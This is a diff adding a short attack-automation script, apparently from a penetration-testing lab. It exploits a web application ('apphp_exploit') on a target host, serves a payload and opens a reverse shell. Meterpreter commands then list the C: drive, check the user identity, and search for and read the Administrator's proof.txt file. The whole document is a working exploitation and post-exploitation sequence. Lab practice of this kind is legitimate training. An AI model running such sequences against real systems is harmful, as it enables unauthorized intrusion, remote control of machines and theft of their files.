@@ -1,0 +1,14 @@
+apphp_exploit; set lhost 192.168.119.154; set rhost 10.11.1.223; set srvport <SRV_PORT>; set uripath filename.exe; set lport <REVSHELL_PORT>; set delay_to_observe 30; run;
+
+sessions;
+
+# execute dir on the session
+execute_meterpreter_command_in_session; set command dir C:\\; run;
+
+# execute whoami on the session
+execute_meterpreter_command_in_session; set command getuid; run;
+
+# try to find the proof.txt file
+execute_meterpreter_command_in_session; set command search -d C:\\ -f proof.txt; run;
+
+execute_meterpreter_command_in_session; set command cat C:\\Users\\Administrator\\Desktop\\proof.txt; run;
